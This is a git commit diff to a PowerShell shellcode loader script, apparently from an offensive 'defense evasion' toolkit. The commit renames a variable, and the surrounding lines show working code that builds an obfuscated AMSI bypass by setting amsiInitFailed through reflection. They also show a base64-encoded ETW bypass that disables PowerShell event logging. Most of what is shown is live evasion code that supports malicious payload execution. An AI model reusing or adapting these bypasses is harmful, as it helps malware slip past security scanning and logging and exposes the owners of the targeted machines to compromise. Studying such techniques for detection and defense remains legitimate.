37a37ac632fd508e798c54afd20ba835b0bd9e61
Jean-Francois-C <61638766+Jean-Francois-C@users.noreply.github.com>
2023-03-22 00:29:14 +0100

    Update

--- Defense evasion (examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader.ps1
+++ Defense evasion (examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader.ps1
@@ -188,13 +188,13 @@ function Invoke-PoSH-ShellCodeLoader {
         
         Write-Output "[*] Adding 'A'M'S'I' bypass"
         $code_fixed_order4 += '${19} = "System.Management.Automation.A";${21} = "Utils";${20} = "si"' + "`r`n"
-        $stub_template += $code_fixed_order4 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
         $code_fixed_order5 += '${22} = [Ref].Assembly.GetType((${19}+"m"+${20}+${21}));${24}="Failed"' + "`r`n"
-        $stub_template += $code_fixed_order5 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
         $code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
-        $stub_template += $code_fixed_order6 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
         $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
-        $stub_template += $code_fixed_order7 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
         $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
@@ -357,13 +357,13 @@ function Invoke-PoSH-ShellCodeLoader {
         
         Write-Output "[*] Adding 'A'M'S'I' bypass"
         $code_fixed_order4 += '${19} = "System.Management.Automation.A";${21} = "Utils";${20} = "si"' + "`r`n"
-        $stub_template += $code_fixed_order4 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
         $code_fixed_order5 += '${22} = [Ref].Assembly.GetType((${19}+"m"+${20}+${21}));${24}="Failed"' + "`r`n"
-        $stub_template += $code_fixed_order5 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
         $code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
-        $stub_template += $code_fixed_order6 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
         $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
-        $stub_template += $code_fixed_order7 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
         $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
@@ -526,13 +526,13 @@ function Invoke-PoSH-ShellCodeLoader {
         
         Write-Output "[*] Adding 'A'M'S'I' bypass"
         $code_fixed_order4 += '${19} = "System.Management.Automation.A";${21} = "Utils";${20} = "si"' + "`r`n"
-        $stub_template += $code_fixed_order4 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
         $code_fixed_order5 += '${22} = [Ref].Assembly.GetType((${19}+"m"+${20}+${21}));${24}="Failed"' + "`r`n"
-        $stub_template += $code_fixed_order5 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
         $code_fixed_order6 += '${23} = ${22}.GetField(("am"+${20}+"Init"+${24}),"NonPublic,Static")' + "`r`n"
-        $stub_template += $code_fixed_order6 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
         $code_fixed_order7 += '${23}.SetValue($null,$true)' + "`r`n"
-        $stub_template += $code_fixed_order7 -join ''
+        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
         $code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
